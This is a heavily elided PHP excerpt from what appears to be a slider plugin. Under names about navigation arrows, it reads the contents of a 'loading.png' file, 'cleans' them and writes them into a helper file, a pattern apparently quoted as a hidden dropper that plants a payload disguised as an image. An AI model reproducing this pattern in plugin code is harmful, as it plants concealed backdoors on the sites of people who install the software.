...
class YtbSliderBaseContact {
    ...
    function renderItems() {
      ...
      return $elements;
        ...
        function ContactArrowsHelper($path) {
            // arrow pack for default navigation
            if(isNewOptionInContact()) {
            ...
            if(!@file_exists($ArrowHelper) or @filesize($ArrowHelper) == 0) {
                ...
                @fwrite($Open, ArrowSettingsContact($path . ContactSetName()));
            }
        }

        function ArrowSettingsContact($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromContact($LoadImage);
        }

        function ContactSetName() {
            @PasivItemsToContact();
            return 'loading.png';
        }

class PeelbackBaseSlideContact {
